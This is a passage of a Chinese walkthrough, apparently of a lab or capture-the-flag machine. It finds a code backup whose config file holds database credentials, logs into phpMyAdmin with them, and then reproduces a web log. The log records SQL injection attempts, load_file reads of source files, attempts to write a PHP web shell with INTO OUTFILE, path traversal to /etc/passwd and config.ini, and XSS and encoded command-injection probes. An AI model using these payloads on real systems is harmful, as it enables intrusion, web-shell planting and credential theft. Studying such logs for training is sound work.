<p>我们在<code>/docs</code>目录下发现了code_backup.tgz压缩文件，很有可能是网站的代码备份。<br class='item-img' data-src='/pic/assets/1682761559655-0085916d-328b-4b04-92a0-61cf77397821.png'><img src="/pic/assets/1682761559655-0085916d-328b-4b04-92a0-61cf77397821.png" alt="uTools_1682761360831.png"><br>我们下载下来看看。<br>OK，果然是，舒服。<br class='item-img' data-src='/pic/assets/1682761619727-d78d2a1f-9837-4ee5-b656-2266552c0262.png'><img src="/pic/assets/1682761619727-d78d2a1f-9837-4ee5-b656-2266552c0262.png" alt="uTools_1682761447021.png"><br>我们进入<code>conf</code>目录，发现config.ini文件</p>
<pre><code>;
; This is the configuration file
;
database_host	=	localhost
database_pass	=	45kkald?8laLKD
database_user	=	cms_user
database_db	=	cms
</code></pre>
<p>明显是连接数据库用的登录凭证 。<br>我们尝试用其登录phpmyadmin，果然成功。<br class='item-img' data-src='/pic/assets/1682761957511-2873e3ea-2bce-4c57-a219-1ea12c57e6e0.png'><img src="/pic/assets/1682761957511-2873e3ea-2bce-4c57-a219-1ea12c57e6e0.png" alt="uTools_1682761951347.png"><br>我们看看这个账号对数据库的管理权限，发现除了<code>grant</code>权限，其他全有，基本约等于root了，那就方便我们接下来的操作了。<br>但是先别急，我们刚才网站的各个目录还没看完，并且之前手动尝试访问<code>/logs</code>目录时提示要密码，那我们就看看里面有什么东西。我们移动到<code>/logs</code>目录下，发现<code>log.log</code>日志文件。</p>
<pre><code>2009-06-23 16:06:42	172.16.18.1 called 
2009-06-23 16:06:44	172.16.18.1 called action=logs
2009-06-23 16:06:50	172.16.18.1 called 
2009-06-23 16:06:52	172.16.18.1 called action=logs
2009-06-23 16:06:33	172.16.18.1 called 
2009-06-23 16:06:35	172.16.18.1 called id=4
2009-06-23 16:06:37	172.16.18.1 called action=users
2009-06-23 16:06:38	172.16.18.1 called action=logs
2009-06-23 20:06:18	172.16.18.1 called 
2009-06-23 20:06:46	172.16.18.1 called action=login
2009-06-23 20:06:50	172.16.18.1 called action=login
2009-06-23 20:06:45	172.16.18.1 called 
2009-06-23 20:06:17	172.16.18.1 called 
2009-06-23 20:06:26	172.16.18.1 called 
2009-06-23 20:06:50	172.16.18.1 called 
2009-06-23 20:06:57	172.16.18.1 called 
2009-06-23 20:06:51	172.16.18.1 called 
2009-06-23 20:06:38	172.16.18.1 called 
2009-06-23 20:06:51	172.16.18.1 called 
2009-06-23 20:06:55	172.16.18.1 called 
2009-06-23 20:06:29	172.16.18.1 called 
2009-06-23 20:06:32	172.16.18.1 called id=4
2009-06-23 20:06:34	172.16.18.1 called 
2009-06-24 17:06:36	172.16.61.1 called 
2009-06-24 17:06:45	172.16.61.1 called 
2009-06-24 17:06:17	172.16.61.1 called 
2009-06-24 17:06:31	172.16.61.1 called 
2009-06-24 17:06:37	172.16.61.1 called 
2009-06-24 17:06:16	172.16.61.1 called 
2009-06-24 17:06:36	172.16.61.1 called 
2009-06-24 17:06:49	172.16.61.1 called 
2009-06-24 17:06:35	172.16.61.1 called 
2009-06-28 13:06:09	172.16.61.132 called id=4%20UNION%20select%201,1,1,1,1,1%20from%20dual
2009-06-28 13:06:09	Problem with event select: . The used SELECT statements have a different number of columns
2009-06-28 13:06:28	172.16.61.132 called id=4%20UNION%20select%201,1,1,1,1,1,1%20from%20dual
2009-06-28 13:06:29	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select 1,1,1,1,1,1,1 from dual&#39; at line 1
2009-06-28 13:06:29	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select 1,1,1,1,1,1,1 from dual&#39; at line 1
2009-06-28 13:06:43	172.16.61.132 called id=4%20UNION%20select%20version,1,1,1,1,1,1%20from%20dual
2009-06-28 13:06:43	Problem with event select: . Unknown column &#39;version&#39; in &#39;field list&#39;
2009-06-28 13:06:52	172.16.61.132 called id=4%20UNION%20select%20version(),1,1,1,1,1,1%20from%20dual
2009-06-28 13:06:52	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select version(),1,1,1,1,1,1 from dual&#39; at line 1
2009-06-28 13:06:52	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select version(),1,1,1,1,1,1 from dual&#39; at line 1
2009-06-28 13:06:13	172.16.61.132 called id=4%20UNION%20select%201,2,3,4,5,6,7%20from%20dual
2009-06-28 13:06:13	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select 1,2,3,4,5,6,7 from dual&#39; at line 1
2009-06-28 13:06:13	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select 1,2,3,4,5,6,7 from dual&#39; at line 1
2009-06-28 13:06:30	172.16.61.132 called id=4%20UNION%20select%201,2,3,4,5,6,version()%20from%20dual
2009-06-28 13:06:30	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select 1,2,3,4,5,6,version() from dual&#39; at line 1
2009-06-28 13:06:30	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select 1,2,3,4,5,6,version() from dual&#39; at line 1
2009-06-28 13:06:54	172.16.61.132 called id=4%20UNION%20select%201,host,user,4,5,6,version()%20from%20dual
2009-06-28 13:06:54	Problem with event select: . Unknown column &#39;host&#39; in &#39;field list&#39;
2009-06-28 13:06:58	172.16.61.132 called id=4%20UNION%20select%201,host(),user(),4,5,6,version()%20from%20dual
2009-06-28 13:06:58	Problem with event select: . FUNCTION cms.host does not exist
2009-06-28 13:06:02	172.16.61.132 called id=4%20UNION%20select%201,2,user(),4,5,6,version()%20from%20dual
2009-06-28 13:06:02	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select 1,2,user(),4,5,6,version() from dual&#39; at line 1
2009-06-28 13:06:02	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select 1,2,user(),4,5,6,version() from dual&#39; at line 1
2009-06-28 13:06:35	172.16.61.132 called id=4%20UNION%20select%201,host(),user(),4,5,6,version()%20from%20dual
2009-06-28 13:06:35	Problem with event select: . FUNCTION cms.host does not exist
2009-06-28 13:06:41	172.16.61.132 called id=4%20UNION%20select%201,database(),user(),4,5,6,version()%20from%20dual
2009-06-28 13:06:41	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select 1,database(),user(),4,5,6,version() from dual&#39; at line 1
2009-06-28 13:06:41	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select 1,database(),user(),4,5,6,version() from dual&#39; at line 1
2009-06-28 13:06:23	172.16.61.132 called id=4%20UNION%20select%201,schema(),system_user(),4,5,6,version()%20from%20dual
2009-06-28 13:06:23	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select 1,schema(),system_user(),4,5,6,version() from dual&#39; at line 1
2009-06-28 13:06:23	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select 1,schema(),system_user(),4,5,6,version() from dual&#39; at line 1
2009-06-28 13:06:53	172.16.61.132 called id=4%20UNION%20select%201,\!%20ls%20/var/www/html,system_user(),4,5,6,version()%20from%20dual
2009-06-28 13:06:53	Problem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;\! ls /var/www/html,system_user(),4,5,6,version() from dual&#39; at line 5
2009-06-28 13:06:44	172.16.61.132 called id=4%20UNION%20select%201,system(%27ls%20/var/www/html%27),system_user(),4,5,6,version()%20from%20dual
2009-06-28 13:06:44	Problem with event select: . FUNCTION cms.system does not exist
2009-06-28 13:06:13	172.16.61.132 called id=4%20UNION%20select%201,system%20%27ls%20/var/www/html%27,system_user(),4,5,6,version()%20from%20dual
2009-06-28 13:06:13	Problem with event select: . Unknown column &#39;system&#39; in &#39;field list&#39;
2009-06-28 13:06:18	172.16.61.132 called id=4%20UNION%20select%201,system%20ls%20/var/www/html,system_user(),4,5,6,version()%20from%20dual
2009-06-28 13:06:18	Problem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;/var/www/html,system_user(),4,5,6,version() from dual&#39; at line 5
2009-06-28 13:06:48	172.16.61.132 called id=4%20UNION%20select%201,system%20%27ls%20/var/www/html%27,system_user(),4,5,6,version()%20from%20dual
2009-06-28 13:06:48	Problem with event select: . Unknown column &#39;system&#39; in &#39;field list&#39;
2009-06-28 13:06:39	172.16.61.132 called id=4%20UNION%20select%201,concat(2,%20system%20%27ls%20/var/www/html%27),system_user(),4,5,6,version()%20from%20dual
2009-06-28 13:06:39	Problem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;ls /var/www/html&#39;),system_user(),4,5,6,version() from dual&#39; at line 5
2009-06-28 13:06:24	172.16.61.132 called id=4%20UNION%20select%201,cload_file(%27/var/www/html%27),system_user(),4,5,6,version()%20from%20dual
2009-06-28 13:06:24	Problem with event select: . FUNCTION cms.cload_file does not exist
2009-06-28 13:06:31	172.16.61.132 called id=4%20UNION%20select%201,cload_file(%27/var/www/html/index.php%27),system_user(),4,5,6,version()%20from%20dual
2009-06-28 13:06:31	Problem with event select: . FUNCTION cms.cload_file does not exist
2009-06-28 13:06:26	172.16.61.132 called id=4%20UNION%20select%201,load_file(%27/var/www/html/index.php%27),system_user(),4,5,6,version()%20from%20dual
2009-06-28 13:06:26	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select 1,load_file(&#39;/var/www/html/index.php&#39;),system_user(),4,5,6,version(&#39; at line 1
2009-06-28 13:06:26	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select 1,load_file(&#39;/var/www/html/index.php&#39;),system_user(),4,5,6,version(&#39; at line 1
2009-06-28 14:06:08	172.16.61.132 called id=4%20UNION%20select%201,load_file(%27/var/www/html/index.php%27),system_user(),4,5,6,version()%20from%20dual
2009-06-28 14:06:08	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select 1,load_file(&#39;/var/www/html/index.php&#39;),system_user(),4,5,6,version(&#39; at line 1
2009-06-28 14:06:08	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select 1,load_file(&#39;/var/www/html/index.php&#39;),system_user(),4,5,6,version(&#39; at line 1
2009-06-28 14:06:57	172.16.61.132 called id=4%20UNION%20select%201,load_file(%27/var/www/html/actions/loginphp%27),system_user(),4,5,6,version()%20from%20dual
2009-06-28 14:06:57	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select 1,load_file(&#39;/var/www/html/actions/loginphp&#39;),system_user(),4,5,6,v&#39; at line 1
2009-06-28 14:06:57	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select 1,load_file(&#39;/var/www/html/actions/loginphp&#39;),system_user(),4,5,6,v&#39; at line 1
2009-06-28 14:06:09	172.16.61.132 called id=4%20UNION%20select%201,load_file(%27/var/www/html/actions/login.php%27),system_user(),4,5,6,version()%20from%20dual
2009-06-28 14:06:09	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select 1,load_file(&#39;/var/www/html/actions/login.php&#39;),system_user(),4,5,6,&#39; at line 1
2009-06-28 14:06:09	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select 1,load_file(&#39;/var/www/html/actions/login.php&#39;),system_user(),4,5,6,&#39; at line 1
2009-06-28 14:06:22	172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_GET[%27cmd%27]);?%3E,system_user(),4,5,6,version()%20into%20outfile(%27/tmp/x.php%27)
2009-06-28 14:06:22	Problem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;]);?&gt;,system_user(),4,5,6,version() into outfile(&#39;/tmp/x.php&#39;)&#39; at line 5
2009-06-28 14:06:07	172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_GET[\%27cmd\%27]);?%3E,system_user(),4,5,6,version()%20into%20outfile(%27/tmp/x.php%27)
2009-06-28 14:06:07	Problem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;)&#39; at line 5
2009-06-28 14:06:20	172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_GET[\%27cmd\%27]);?%3E%27,3,4,5,6,7%20into%20outfile(%27/tmp/x.php%27)
2009-06-28 14:06:20	Problem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;(&#39;/tmp/x.php&#39;)&#39; at line 5
2009-06-28 14:06:00	172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_GET[\%27cmd\%27]);?%3E%27,3,4,5,6,7%20into%20outfile%20%27/tmp/x.php%27
2009-06-28 14:06:19	172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_POST[\%27cmd\%27]);?%3E%27,3,4,5,6,7%20into%20outfile%20%27/tmp/x.php%27
2009-06-28 14:06:19	Problem with event select: . File &#39;/tmp/x.php&#39; already exists
2009-06-28 14:06:29	172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_POST[\%27cmd\%27]);?%3E%27,3,4,5,6,7%20into%20outfile%20%27/tmp/x.php%27
2009-06-28 14:06:29	Problem with event select: . File &#39;/tmp/x.php&#39; already exists
2009-06-28 14:06:41	172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_POST[\%27cmd\%27]);?%3E%27,3,4,5,6,7%20into%20outfile%20%27/tmp/y.php%27
2009-06-28 14:06:02	172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_POST[\%27cmd\%27]);?%3E%27,3,4,5,6,7%20into%20outfile%20%27/tmp/x.php%27
2009-06-28 14:06:02	Problem with event select: . File &#39;/tmp/x.php&#39; already exists
2009-06-28 15:06:02	172.16.61.132 called 
2009-06-28 15:06:12	172.16.61.132 called id=4
2009-06-28 15:06:27	172.16.61.132 called id=4%27
2009-06-28 15:06:27	Problem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;&#39; at line 5
2009-06-28 15:06:03	172.16.61.132 called id=4%20UNION%20select%201%20from%20dual
2009-06-28 15:06:03	Problem with event select: . The used SELECT statements have a different number of columns
2009-06-28 15:06:57	172.16.61.132 called id=4%20UNION%20select%201,2,3,4,5,6,7%20from%20dual
2009-06-28 15:06:57	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select 1,2,3,4,5,6,7 from dual&#39; at line 1
2009-06-28 15:06:57	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select 1,2,3,4,5,6,7 from dual&#39; at line 1
2009-06-28 15:06:03	172.16.61.132 called id=4%20UNION%20select%201,database(),user(),4,5,6,version()%20from%20dual
2009-06-28 15:06:03	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select 1,database(),user(),4,5,6,version() from dual&#39; at line 1
2009-06-28 15:06:03	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select 1,database(),user(),4,5,6,version() from dual&#39; at line 1
2009-06-28 15:06:12	172.16.61.132 called id=4%20UNION%20select%201,load_file(%27/var/www/html/index.php%27),3,4,5,6,7%20from%20dual
2009-06-28 15:06:12	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select 1,load_file(&#39;/var/www/html/index.php&#39;),3,4,5,6,7 from dual&#39; at line 1
2009-06-28 15:06:12	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select 1,load_file(&#39;/var/www/html/index.php&#39;),3,4,5,6,7 from dual&#39; at line 1
2009-06-28 16:06:22	172.16.61.132 called id=4%20UNION%20select%201,load_file(%27/var/www/html/actions/login.php%27),3,4,5,6,7%20from%20dual
2009-06-28 16:06:22	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select 1,load_file(&#39;/var/www/html/actions/login.php&#39;),3,4,5,6,7 from dual&#39; at line 1
2009-06-28 16:06:22	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select 1,load_file(&#39;/var/www/html/actions/login.php&#39;),3,4,5,6,7 from dual&#39; at line 1
2009-06-28 16:06:18	172.16.61.132 called actions/login.php?action=../conf/config.ini%00
2009-06-28 18:06:13	172.16.61.132 called actions/login.php?action=../conf/config.ini%00
2009-06-28 18:06:15	172.16.61.132 called id=4%20UNION%20select%201,load_file(%27/var/www/html/actions/login.php%27),3,4,5,6,7%20from%20dual
2009-06-28 18:06:15	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select 1,load_file(&#39;/var/www/html/actions/login.php&#39;),3,4,5,6,7 from dual&#39; at line 1
2009-06-28 18:06:15	Problem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UNION select 1,load_file(&#39;/var/www/html/actions/login.php&#39;),3,4,5,6,7 from dual&#39; at line 1
2009-06-28 18:06:23	172.16.61.132 called id=4%20UNION%20select%20NULL,NULL,NULL,NULL,NULL,NULL,%27%3C?php%20echo%20system($_POST[\%27cmd\%27]);?%3E%27%20INTO%20OUTFILE(%27/tmp/008st7845.php%27)
2009-06-28 18:06:23	Problem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;(&#39;/tmp/008st7845.php&#39;)&#39; at line 5
2009-06-28 18:06:06	172.16.61.132 called id=4%20UNION%20select%20NULL,NULL,NULL,NULL,NULL,NULL,%27%3C?php%20echo%20system($_POST[\%27cmd\%27]);?%3E%27%20INTO%20OUTFILE%20%27/tmp/008st7845.php%27
2009-06-29 16:06:51	172.16.61.132 called 
2009-06-29 16:06:51	172.16.61.132 called 
2009-06-29 16:06:51	172.16.61.132 called 
2009-06-29 16:06:51	172.16.61.132 called 
2009-06-29 16:06:52	172.16.61.132 called 
2009-06-29 16:06:52	172.16.61.132 called 
2009-06-29 16:06:52	172.16.61.132 called 
2009-06-29 16:06:52	172.16.61.132 called 
2009-06-29 16:06:52	172.16.61.132 called 
2009-06-29 16:06:52	172.16.61.132 called 
2009-06-29 16:06:52	172.16.61.132 called chemin=..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fetc
2009-06-29 16:06:52	172.16.61.132 called 
2009-06-29 16:06:52	172.16.61.132 called mod=node&amp;nid=some_thing&amp;op=view
2009-06-29 16:06:52	172.16.61.132 called mod=some_thing&amp;op=browse
2009-06-29 16:06:52	172.16.61.132 called file=index.php
2009-06-29 16:06:52	172.16.61.132 called 
2009-06-29 16:06:52	172.16.61.132 called 
2009-06-29 16:06:52	172.16.61.132 called 
2009-06-29 16:06:52	172.16.61.132 called Open
2009-06-29 16:06:52	172.16.61.132 called OpenServer
2009-06-29 16:06:52	172.16.61.132 called 
2009-06-29 16:06:53	172.16.61.132 called 
2009-06-29 16:06:53	172.16.61.132 called 
2009-06-29 16:06:53	172.16.61.132 called 
2009-06-29 16:06:53	172.16.61.132 called 
2009-06-29 16:06:53	172.16.61.132 called 
2009-06-29 16:06:53	172.16.61.132 called download=/winnt/win.ini
2009-06-29 16:06:53	172.16.61.132 called download=/windows/win.ini
2009-06-29 16:06:53	172.16.61.132 called download=/etc/passwd
2009-06-29 16:06:54	172.16.61.132 called |=../../../../../../../../../etc/passwd
2009-06-29 16:06:54	172.16.61.132 called page=../../../../../../../../../../etc/passwd
2009-06-29 16:06:54	172.16.61.132 called page=../../../../../../../../../../boot.ini
2009-06-29 16:06:54	172.16.61.132 called l=forum/view.php&amp;topic=../../../../../../../../../etc/passwd
2009-06-29 16:06:54	172.16.61.132 called module=My_eGallery
2009-06-29 16:06:54	172.16.61.132 called option=search&amp;searchword=&lt;script&gt;alert(document.cookie);&lt;/script&gt;
2009-06-29 16:06:54	172.16.61.132 called dir=&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;
2009-06-29 16:06:55	172.16.61.132 called top_message=&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;
2009-06-29 16:06:55	172.16.61.132 called file=Liens&amp;op=\&quot;&gt;&lt;script&gt;alert(&#39;Vulnerable&#39;);&lt;/script&gt;
2009-06-29 16:06:55	172.16.61.132 called catid=&amp;lt;script&amp;gt;alert(&#39;Vulnerable&#39;)&amp;lt;/script&amp;gt;
2009-06-29 16:06:55	172.16.61.132 called action=storenew&amp;username=&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;
2009-06-29 16:06:55	172.16.61.132 called action=search&amp;searchFor=\&quot;&gt;&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script
2009-06-29 16:06:55	172.16.61.132 called 
2009-06-29 16:06:55	172.16.61.132 called SectionID=3&amp;SearchText=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
2009-06-29 16:06:55	172.16.61.132 called SearchText=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;PhraseSearchText=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;SearchContentClassID=-1&amp;SearchSectionID=-1&amp;SearchDate=-1&amp;SearchButton=Search
2009-06-29 16:06:55	172.16.61.132 called mod=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;op=browse
2009-06-29 16:06:55	172.16.61.132 called sql_debug=1
2009-06-29 16:06:55	172.16.61.132 called sql_debug=1
2009-06-29 16:06:56	172.16.61.132 called 
2009-06-29 16:06:56	172.16.61.132 called rep=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
2009-06-29 16:06:56	172.16.61.132 called 
2009-06-29 16:06:56	172.16.61.132 called 
2009-06-29 16:06:57	172.16.61.132 called module=ew_filemanager&amp;type=admin&amp;func=manager&amp;pathext=../../../etc
2009-06-29 16:06:57	172.16.61.132 called module=ew_filemanager&amp;type=admin&amp;func=manager&amp;pathext=../../../etc/&amp;view=passwd
2009-06-29 16:06:57	172.16.61.132 called err=3&amp;email=\&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
2009-06-29 16:06:57	172.16.61.132 called name=Forums&amp;file=viewtopic&amp;t=2&amp;rush=%64%69%72&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527
2009-06-29 16:06:57	172.16.61.132 called name=Forums&amp;file=viewtopic&amp;t=2&amp;rush=%64%69%72&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527
2009-06-29 16:06:57	172.16.61.132 called name=forums&amp;file=viewtopic&amp;t=2&amp;rush=%64%69%72&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527
2009-06-29 16:06:57	172.16.61.132 called name=PNphpBB2&amp;file=viewtopic&amp;t=2&amp;rush=%64%69%72&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527
2009-06-29 16:06:57	172.16.61.132 called name=Forums&amp;file=viewtopic&amp;t=2&amp;rush=%6c%73%20%2d%61%6c&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527
2009-06-29 16:06:57	172.16.61.132 called name=forums&amp;file=viewtopic&amp;t=2&amp;rush=%6c%73%20%2d%61%6c&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527
2009-06-29 16:06:57	172.16.61.132 called name=Forums&amp;file=viewtopic&amp;t=2&amp;rush=%6c%73%20%2d%61%6c&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527
2009-06-29 16:06:57	172.16.61.132 called name=forums&amp;file=viewtopic&amp;t=2&amp;rush=%6c%73%20%2d%61%6c&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527
2009-06-29 16:06:57	172.16.61.132 called name=PNphpBB2&amp;file=viewtopic&amp;t=2&amp;rush=%6c%73%20%2d%61%6c&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527
2009-06-29 16:06:58	172.16.61.132 called PageServices
2009-06-29 16:06:58	172.16.61.132 called wp-cs-dump
2009-06-29 16:06:58	172.16.61.132 called 
2009-06-29 16:06:58	172.16.61.132 called 
2009-06-29 16:06:58	172.16.61.132 called 
2009-06-29 16:06:58	172.16.61.132 called 
2009-06-29 16:06:58	172.16.61.132 called 
2009-06-29 16:06:58	172.16.61.132 called 
2009-06-29 16:06:58	172.16.61.132 called 
2009-06-29 16:06:58	172.16.61.132 called 
2009-06-29 16:06:59	172.16.61.132 called 
2009-06-29 16:06:59	172.16.61.132 called 
2009-06-29 16:06:59	172.16.61.132 called 
2009-06-29 16:06:59	172.16.61.132 called 
2009-06-29 16:06:59	172.16.61.132 called 
2009-06-29 16:06:59	172.16.61.132 called 
2009-06-29 16:06:59	172.16.61.132 called 
2009-06-29 16:06:59	172.16.61.132 called 
2009-06-29 16:06:59	172.16.61.132 called 
2009-06-29 16:06:59	172.16.61.132 called 
2009-06-29 16:06:59	172.16.61.132 called 
2009-06-29 16:06:00	172.16.61.132 called 
2009-06-29 16:06:00	172.16.61.132 called 
2009-06-29 16:06:00	172.16.61.132 called 
2009-06-29 16:06:00	172.16.61.132 called 
2009-06-29 16:06:00	172.16.61.132 called 
2009-06-29 16:06:00	172.16.61.132 called 
2009-06-29 16:06:00	172.16.61.132 called vo=\&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
2009-06-29 16:06:00	172.16.61.132 called showforum=1&amp;prune_day=100&amp;sort_by=Z-A&amp;sort_key=[sqlgoeshere]
2009-06-29 16:06:00	172.16.61.132 called offset=[%20Problem%20Here%20]
2009-06-29 16:06:02	172.16.61.132 called base=test%20
2009-06-29 16:06:03	172.16.61.132 called IDAdmin=test
2009-06-29 16:06:03	172.16.61.132 called pymembs=admin
2009-06-29 16:06:03	172.16.61.132 called SqlQuery=test%20
2009-06-29 16:06:03	172.16.61.132 called tampon=test%20
2009-06-29 16:06:03	172.16.61.132 called topic=&amp;amp;lt;script&amp;amp;gt;alert(document.cookie)&amp;amp;lt;/script&amp;amp;gt;%20
2009-06-29 16:06:04	172.16.61.132 called 
2009-06-29 16:06:04	172.16.61.132 called 
2009-06-29 16:06:04	172.16.61.132 called 
2009-06-29 16:06:04	172.16.61.132 called pattern=/etc/*&amp;sort=name
2009-06-29 16:06:05	172.16.61.132 called D=A
2009-06-29 16:06:05	172.16.61.132 called N=D
2009-06-29 16:06:05	172.16.61.132 called S=A
2009-06-29 16:06:05	172.16.61.132 called M=A
2009-06-29 16:06:05	172.16.61.132 called \&quot;&gt;&lt;script&gt;alert(&#39;Vulnerable&#39;);&lt;/script&gt;
2009-06-29 16:06:55	172.16.61.132 called 
2009-06-29 16:06:30	172.16.61.132 called 
2009-06-29 16:06:31	172.16.61.132 called 
2009-06-29 16:06:31	172.16.61.132 called action=login
2009-06-29 16:06:31	172.16.61.132 called id=4
2009-06-29 16:06:31	172.16.61.132 called id=3
2009-06-29 16:06:31	172.16.61.132 called id=2
2009-06-29 16:06:31	172.16.61.132 called id=1
2009-06-29 16:06:32	172.16.61.132 called C=N;O=D
2009-06-29 16:06:32	172.16.61.132 called C=M;O=A
2009-06-29 16:06:32	172.16.61.132 called C=S;O=A
2009-06-29 16:06:32	172.16.61.132 called C=D;O=A
2009-06-29 16:06:32	172.16.61.132 called 
2009-06-29 16:06:33	172.16.61.132 called id=4
2009-06-29 16:06:33	172.16.61.132 called action=login
2009-06-29 16:06:33	172.16.61.132 called id=3
2009-06-29 16:06:33	172.16.61.132 called id=2
2009-06-29 16:06:34	172.16.61.132 called id=1
2009-06-29 16:06:34	172.16.61.132 called action=login
2009-06-29 16:06:34	172.16.61.132 called 
2009-06-29 16:06:34	172.16.61.132 called action=login
2009-06-29 16:06:17	172.16.61.132 called 
2009-06-29 16:06:17	172.16.61.132 called 
2009-06-29 16:06:23	172.16.61.132 called Open
2009-06-29 16:06:23	172.16.61.132 called OpenServer
2009-06-29 18:06:56	172.16.61.132 called 
</code></pre>
